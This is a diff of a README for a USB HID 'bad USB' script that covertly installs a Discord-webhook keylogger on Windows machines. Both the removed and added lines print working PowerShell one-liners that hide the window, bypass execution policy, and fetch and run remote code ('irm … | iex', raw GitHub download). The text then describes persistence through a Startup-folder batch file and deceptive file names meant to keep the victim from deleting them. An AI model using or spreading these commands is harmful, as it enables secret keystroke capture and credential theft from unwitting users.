@@ -28,26 +28,23 @@ I havent tested any others but if you do please open up an issue and tell me how
 # How it Works:
 
 ## The rubber ducky script
-When the grabber.dd runs it opens a powershell terminal using ``control shift enter`` to open it with admin privelages and enters this string:
+When the grabber.dd runs it opens a run dialoge with admin privileges and enters this script.
 
 ```powershell
-powershell -w h -NoP -NonI -Exec Bypass -c "mkdir 'C:\system32\' ; cd C:\system32\ ; iwr -Uri https://raw.githubusercontent.com/simen64/Pico-HID-Scripts/main/discord-keylogger/logger.py -OutFile C:\system32\sys-file.py ; py -m pip install discordwebhook pynput ; '@echo off', 'start /B pythonw.exe "C:\system32\sys-file.py"' | Set-Content -Path 'C:\system32\startup.bat'
-; cp 'C:\system32\startup.bat' '$Env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' ; Python sys-file.py <your discord webhook here>"
+powershell -W h -NonI -NoP -Ep bypass -c "$dc = '<your discord webhook here>'; irm https://shorturl.at/blGV | iex"
 ```
-
-### Flags used:
-
-The ```powershell -w h -NoP -NonI -Exec Bypass -c``` tells powershell to execute a set of commands with some flags:
-- ```-w h``` tells powershell to run in a hidden window so the victim cant see logs
-- ```-NoP``` makes sure that none of the users profiles are loaded, which could mess up execution
-- ```-NonI``` Makes the user unable to interact with the script while its running
-- ```-Exec Bypass``` Makes powershell bypass the execution policy which allows powershell to run scripts
-- ```-c``` tells powershell what commands to execute, the commands are enclosed in quotes and seperated with semicolons
-- Now the script proceecds to execute a sequence of commands
+This line opens a hidden windows with ``-W h`` a non interactive windows with ``-NonI`` no user profiles with ``NoP`` and bypasses the anti script execution policy using ``-Ep bypass``
+Then it sets the ``$dc`` variable to your webhook.
+And last but not least it downloads the ekylog-activator.ps1 script and executes it. The download link is shortened to fit inside the run dialoge. (I want to host my own site in the future where i can have my own directly short links)
 
 (copied from the [chrome password stealer](https://github.com/simen64/Pico-HID-Scripts/tree/main/chrome-password-stealerw) README thats made by me)
 
-### Commands ran:
+## The activator script
+
+I used to have the bad usb enter all of these commands that sets the keylogger up, but i realised i can just paste it into a powershell script and shorten down the time that the usb needs to be plugged in drasticly. This is why the powershell script isnt really structured in a normal way, and i am to lazy to actually structure it because powershell scripting sucks. But if anyone wants to do it create a pull request.
+
+### Commands ran by the ps script:
+
 1. We make a directory called ``system32`` in the C: drive using mkdir ``C:\system32\``. I decided to call it ``system32`` as many people would not want to delete the a folder named system32.
 2. Next we enter the directory using ``cd C:\system32\``
 3. Then we run `iwr -Uri https://raw.githubusercontent.com/simen64/Pico-HID-Scripts/main/discord-keylogger/logger.py -OutFile C:\system32\sys-file.py` to download the keylogger and spit it out as sys-file.py (again to trick the user to not deleting the file)
